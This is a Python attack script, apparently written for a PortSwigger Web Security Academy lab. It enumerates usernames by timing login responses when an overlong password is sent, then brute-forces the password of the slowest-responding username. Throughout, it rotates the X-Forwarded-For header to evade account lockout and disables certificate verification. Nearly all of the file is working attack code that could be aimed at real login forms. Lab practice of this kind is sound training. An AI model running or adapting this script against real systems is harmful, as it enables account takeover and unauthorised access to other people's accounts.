#this script is for portswigger username enumeration via response timing.  it first creates a file of the username and associated
#time before a response.  it then makes a dictionary out of that file and sorts it so username with the longest time is the first
#in a list.  It then uses that username and launches a brute force attack until it finds a correct password based on the lack
#of an "invalid username or password" response.  Note that you also need to vary the X-Forwarded-For: header to avoid being
#locked out by the web app
#!/usr/bin/python3
import requests
import os
import warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning
proxy = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

warnings.simplefilter('ignore',InsecureRequestWarning) #ignores insecure certificate warning

cookies = {'session' : 'MuIVf491ChaG15PT29Hu1cB6TXVJKJyM'}

password = "Dougiedougiedougiedougiedougiedougidougiedougieedougiedougiedougiedougiedougiedougidougiedougieedougiedougiedougiedodougiedougiedougiedougiedougiedougidougiedougieedougiedougiedougiedougiedougiedougidougiedougieedougiedougiedougiedodougiedougiedougiedougiedougiedougidougiedougieedougiedougiedougiedougiedougiedougidougiedougieedougiedougiedougiedodougiedougiedouiedougiedougiedougidougiedougieedougiedougiedougiedougiedougiedougidougiedougieedougiedougiedougiedodougiedougiedougiedougiedougiedougidougiedougieedougiedougiedougiedougiedougiedougidougiedougieedougiedougiedougiedodougiedougiedougiedougiedougiedougidougiedougieedougiedougiedougiedougiedougiedougidougiedougieedougiedougiedougiedodougiedougiedougiedougiedougiedougidougiedougieedougiedougiedougiedougiedougiedougidougiedougieedougiedougiedougiedodougiedougiedougiedougiedougiedougidougiedougieedougiedougiedougiedougiedougiedougidougiedougieedougiedougiedougiedodougiedougiedougiedougiedougiedougidougiedougieedougiedougiedougiedougiedougiedougidougiedougieedougiedougiedougiedodougiedougiedouiedougiedougiedougidougiedougieedougiedougiedougiedougiedougiedougidougiedougieedougiedougiedougiedodougiedougiedougiedougiedougiedougidougiedougieedougiedougiedougiedougiedougiedougidougiedougieedougiedougiedougiedodougiedougiedougiedougiedougiedougidougiedougieedougiedougiedougiedougiedougiedougidougiedougieedougiedougiedougiedo"

def user_crack():
	with open("usernames","r") as f:
		for line in f:
			for word in line.split():
				response = requests.post('https://0a88009203b98823c0ca85d8009800d6.web-security-academy.net/login', data = {'username' : word, 'password' : password}, headers = {'X-Forwarded-For': word}, proxies=proxy, verify=False)
				update_file.write(word + ":" + str(response.elapsed.total_seconds()))
				update_file.write('\n')

d = {}
def longest_response():
	with open("response_time","r") as f:
		for line in f:
			(key, val) = line.split(':')
			d[str(key)] = val
			res = list(sorted(d, key=d.__getitem__, reverse=True))
		global username_enum
		username_enum = res[0]
		print("Username is likely " + res[0])
		

def pass_crack():
	with open("passwords","r") as f:
		for line in f:
			for word in line.split():
				response = requests.post('https://0a88009203b98823c0ca85d8009800d6.web-security-academy.net/login', data = {'username' : username_enum, 'password' : word}, headers = {'X-Forwarded-For': word}, proxies=proxy, verify=False)
			if 'Invalid username or password' not in response.text:
				print("Passsword is likely " + word)
				global password_enum
				password_enum = word
				break


update_file = open("response_time","w")
user_crack()
update_file.close()
longest_response()
pass_crack()
